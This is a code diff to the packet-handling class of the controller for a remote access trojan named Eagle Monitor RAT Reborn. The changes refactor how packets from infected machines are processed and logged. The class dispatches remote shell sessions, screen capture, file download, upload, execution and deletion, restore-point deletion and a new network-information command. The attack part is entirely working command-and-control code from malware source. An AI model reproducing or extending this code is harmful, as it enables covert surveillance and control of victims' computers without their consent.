@@ -14,24 +14,41 @@ namespace Eagle_Monitor_RAT_Reborn.Network
 {
     internal class PacketHandler
     {
-        private delegate IPacket PacketParser(IPacket packet, ClientHandler clientHandler);
-
-        private readonly PacketParser packetParser;
-
-        internal PacketHandler(IPacket packet, ClientHandler clientHandler) 
+        static PacketHandler()
         {
-            packetParser = new PacketParser(ParsePacket);
-            packetParser.BeginInvoke(packet, clientHandler, new AsyncCallback(EndPacketRead), null);
+            packetParser = new PacketHandle(HandlePacket);
         }
 
-        private void EndPacketRead(IAsyncResult ar)
+        private delegate IPacket PacketHandle(IPacket packet, ClientHandler clientHandler);
+
+        private static readonly PacketHandle packetParser;
+
+        internal static void StartHandlePacket(IPacket packet, ClientHandler clientHandler)
+        {
+            packetParser.BeginInvoke(packet, clientHandler, new AsyncCallback(EndHandlePacket), clientHandler);
+        }
+
+        private static void EndHandlePacket(IAsyncResult ar)
         {
             IPacket packet = packetParser.EndInvoke(ar);
+            ClientHandler clientHandler = (ClientHandler)ar.AsyncState;
+            IAsyncResult result;
+            string size = Misc.Utils.Numeric2Bytes(packet.PacketSize);
 
-            switch (packet.packetType)
+            if (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm != null && ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.bytesReceivedLabel != null)
+            {
+                result = ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.bytesReceivedLabel.BeginInvoke((Action)(() =>
+                {
+                    ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.bytesReceivedLabel.Text = $"Bytes received : {size}";
+                }));
+                ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.bytesReceivedLabel.EndInvoke(result);
+            }
+
+            switch (packet.PacketType)
             {
                 case PacketType.CONNECTED:
-                    ClientHandler.ClientHandlersList[packet.baseIp].SendPacket(new BaseIpPacket(packet.baseIp));
+                    ClientHandler.StartSendData(clientHandler, new BaseIpPacket(packet.BaseIp));
+                    //ClientHandler.ClientHandlersList[packet.baseIp].SendPacket(new BaseIpPacket(packet.baseIp));
                     break;
 
                 case PacketType.RC_CAPTURE_ON:
@@ -46,92 +63,80 @@ namespace Eagle_Monitor_RAT_Reborn.Network
                 case PacketType.SHELL_COMMAND:
                     return;
 
-                /*case PacketType.SHELL_START:
-                    return;*/
-            }
+                default:
+                    result = Program.mainForm.logsDataGridView.BeginInvoke((MethodInvoker)(() =>
+                    {
+                        int rowId = Program.mainForm.logsDataGridView.Rows.Add();
+                        DataGridViewRow row = Program.mainForm.logsDataGridView.Rows[rowId];
+                        row.Cells["Column11"].Value = packet.HWID;
+                        row.Cells["Column12"].Value = packet.BaseIp;
+                        row.Cells["Column13"].Value = packet.PacketType.ToString();
+                        row.Cells["Column14"].Style.ForeColor = Color.FromArgb(197, 66, 245);
+                        row.Cells["Column14"].Value = packet.PacketState;
+                        row.Cells["Column15"].Value = packet.DatePacketStatus;
+                        row.Cells["Column17"].Value = size;
 
-            string size = Misc.Utils.Numeric2Bytes(packet.packetSize);
+                        switch (packet.PacketType)
+                        {
+                            case PacketType.FM_DOWNLOAD_FILE:
+                                row.Cells["Column16"].Value = ((DownloadFilePacket)packet).fileName;
+                                break;
 
-            IAsyncResult result = Program.mainForm.logsDataGridView.BeginInvoke((MethodInvoker)(() =>
-            {
-                int rowId = Program.mainForm.logsDataGridView.Rows.Add();
-                DataGridViewRow row = Program.mainForm.logsDataGridView.Rows[rowId];
-                row.Cells["Column11"].Value = packet.HWID;
-                row.Cells["Column12"].Value = packet.baseIp;
-                row.Cells["Column13"].Value = packet.packetType.ToString();
-                row.Cells["Column14"].Style.ForeColor = Color.FromArgb(197, 66, 245);
-                row.Cells["Column14"].Value = packet.packetState;
-                row.Cells["Column15"].Value = packet.datePacketStatus;
-                row.Cells["Column17"].Value = size;
+                            case PacketType.FM_DELETE_FILE:
+                                /*  if (((DeleteFilePacket)packet).deleted == true)
+                                      row.Cells["Column16"].Value = Miscellaneous.SplitPath(((DeleteFilePacket)packet).path) + " DELETED";
+                                  else
+                                      row.Cells["Column16"].Value = Miscellaneous.SplitPath(((DeleteFilePacket)packet).path) + " NOT DELETED";*/
+                                break;
 
-                switch (packet.packetType)
-                {
-                    case PacketType.FM_DOWNLOAD_FILE:
-                        row.Cells["Column16"].Value = ((DownloadFilePacket)packet).fileName;
-                        break;
+                            case PacketType.FM_START_FILE:
+                                row.Cells["Column16"].Value = ((StartFilePacket)packet).filePath;
+                                break;
 
-                    case PacketType.FM_DELETE_FILE:
-                      /*  if (((DeleteFilePacket)packet).deleted == true)
-                            row.Cells["Column16"].Value = Miscellaneous.SplitPath(((DeleteFilePacket)packet).path) + " DELETED";
-                        else
-                            row.Cells["Column16"].Value = Miscellaneous.SplitPath(((DeleteFilePacket)packet).path) + " NOT DELETED";*/
-                        break;
+                            case PacketType.FM_GET_FILES_AND_DIRS:
+                                row.Cells["Column16"].Value = ((FileManagerPacket)packet).path;
+                                break;
 
-                    case PacketType.FM_START_FILE:
-                        row.Cells["Column16"].Value = ((StartFilePacket)packet).filePath;
-                        break;
+                            case PacketType.CONNECTED:
+                                row.Cells["Column16"].Value = ClientHandler.ClientHandlersList[packet.BaseIp].ClientStatus;
+                                break;
 
-                    case PacketType.FM_GET_FILES_AND_DIRS:
-                        row.Cells["Column16"].Value = ((FileManagerPacket)packet).path;
-                        break;
+                            case PacketType.FM_SHORTCUT_PATH:
+                                row.Cells["Column16"].Value = ((ShortCutFileManagersPacket)packet).shortCuts;
+                                break;
 
-                    case PacketType.CONNECTED:
-                        row.Cells["Column16"].Value = ClientHandler.ClientHandlersList[packet.baseIp].clientStatus;
-                        break;
+                            case PacketType.FM_UPLOAD_FILE:
+                                /* if (((UploadFilePacket)packet).uploaded == true)
+                                     row.Cells["Column16"].Value = Miscellaneous.SplitPath(((UploadFilePacket)packet).path) + " UPLOADED";
+                                 else
+                                     row.Cells["Column16"].Value = Miscellaneous.SplitPath(((UploadFilePacket)packet).path) + " NOT UPLOADED";*/
+                                break;
 
-                    case PacketType.FM_SHORTCUT_PATH:
-                        row.Cells["Column16"].Value = ((ShortCutFileManagersPacket)packet).shortCuts;
-                        break;
+                            case PacketType.CHAT_ON:
+                                row.Cells["Column16"].Value = ((RemoteChatPacket)packet).msg;
+                                break;
 
-                    case PacketType.FM_UPLOAD_FILE:
-                       /* if (((UploadFilePacket)packet).uploaded == true)
-                            row.Cells["Column16"].Value = Miscellaneous.SplitPath(((UploadFilePacket)packet).path) + " UPLOADED";
-                        else
-                            row.Cells["Column16"].Value = Miscellaneous.SplitPath(((UploadFilePacket)packet).path) + " NOT UPLOADED";*/
-                        break;
+                            case PacketType.UAC_DELETE_RESTORE_POINT:
+                                if (((DeleteRestorePointPacket)packet).deleted == true)
+                                    row.Cells["Column16"].Value = ((DeleteRestorePointPacket)packet).index.ToString() + " DELETED";
+                                else
+                                    row.Cells["Column16"].Value = ((DeleteRestorePointPacket)packet).index.ToString() + " NOT DELETED";
+                                break;
+                        }
+                        Program.mainForm.logsDataGridView.ClearSelection();
+                        Program.mainForm.logsDataGridView.CurrentCell = null;
+                    }));
 
-                    case PacketType.CHAT_ON:
-                        row.Cells["Column16"].Value = ((RemoteChatPacket)packet).msg;
-                        break;
-
-                    case PacketType.UAC_DELETE_RESTORE_POINT:
-                        if(((DeleteRestorePointPacket)packet).deleted == true)
-                            row.Cells["Column16"].Value = ((DeleteRestorePointPacket)packet).index.ToString() + " DELETED";
-                        else
-                            row.Cells["Column16"].Value = ((DeleteRestorePointPacket)packet).index.ToString() + " NOT DELETED";
-                        break;
-                }
-                Program.mainForm.logsDataGridView.ClearSelection();
-                Program.mainForm.logsDataGridView.CurrentCell = null;
-            }));
-
-            Program.mainForm.logsDataGridView.EndInvoke(result);
-
-            if (ClientHandler.ClientHandlersList[packet.baseIp].clientForm != null)
-            {
-                result = ClientHandler.ClientHandlersList[packet.baseIp].clientForm.bytesReceivedLabel.BeginInvoke((Action)(() =>
-                {
-                    ClientHandler.ClientHandlersList[packet.baseIp].clientForm.bytesReceivedLabel.Text = $"Bytes received : {size}";
-                }));
-                ClientHandler.ClientHandlersList[packet.baseIp].clientForm.bytesReceivedLabel.EndInvoke(result);
+                    Program.mainForm.logsDataGridView.EndInvoke(result);
+                    break;
             }
 
             packet = null;
         }
 
-        private IPacket ParsePacket(IPacket packet, ClientHandler clientHandler)
+        private static IPacket HandlePacket(IPacket packet, ClientHandler clientHandler)
         {
-            switch (packet.packetType)
+            switch (packet.PacketType)
             {
                 case PacketType.CONNECTED:
                     new ConnectedPacketHandler((ConnectedPacket)packet, clientHandler);
@@ -273,6 +278,11 @@ namespace Eagle_Monitor_RAT_Reborn.Network
                     new RemoteStartShellPacketHandler(startShellSessionPacket);
                     break;
 
+                case PacketType.MISC_NETWORK_INFORMATION:
+                    NetworkInformationPacket networkInformationPacket = (NetworkInformationPacket)packet;
+                    new NetworkInformationPacketHandler(networkInformationPacket);
+                    break;
+
                 default:
                     break;
                     /*   
@@ -284,8 +294,8 @@ namespace Eagle_Monitor_RAT_Reborn.Network
 
                     */
             }
-            packet.packetState = PacketState.RECEIVED;
-            packet.datePacketStatus = DateTime.Now.ToString();
+            packet.PacketState = PacketState.RECEIVED;
+            packet.DatePacketStatus = DateTime.Now.ToString();
             return packet;
         }
     }
